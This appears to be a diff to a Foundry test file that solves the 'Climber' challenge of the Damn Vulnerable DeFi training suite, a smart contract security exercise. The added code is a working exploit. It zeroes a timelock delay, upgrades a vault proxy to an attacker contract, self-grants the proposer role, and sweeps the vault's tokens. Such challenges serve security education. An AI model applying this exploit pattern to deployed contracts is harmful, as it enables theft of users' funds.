@@ -8,6 +8,10 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {Attack} from "./Attack.t.sol";
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,7 +89,36 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Attack attack = new Attack();
+
+        address[] memory targets = new address[](5);
+        targets[0] = address(timelock);
+        targets[1] = address(vault);
+        targets[2] = address(vault);
+        targets[3] = address(timelock);
+        targets[4] = address(attack);
+
+        uint256[] memory values = new uint256[](5);
+        values[0] = uint256(0);
+        values[1] = uint256(0);
+        values[2] = uint256(0);
+        values[3] = uint256(0);
+        values[4] = uint256(0);
+
+        bytes[] memory dataElements = new bytes[](5);
+        dataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, (uint64(0)));
+        dataElements[1] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(attack), bytes("")));
+        dataElements[2] = abi.encodeCall(Attack.setSweeper, (player));
+        dataElements[3] = abi.encodeCall(AccessControl.grantRole, (keccak256("PROPOSER_ROLE"), address(attack)));
+        dataElements[4] = abi.encodeCall(Attack.schedule, ());
+
+        bytes32 salt = keccak256("salt");
+
+        attack.setData(targets, values, dataElements, salt);
+        timelock.execute(targets, values, dataElements, salt);
+
+        vault.sweepFunds(address(token));
+        token.transfer(recovery, VAULT_TOKEN_BALANCE);
     }
 
     /**
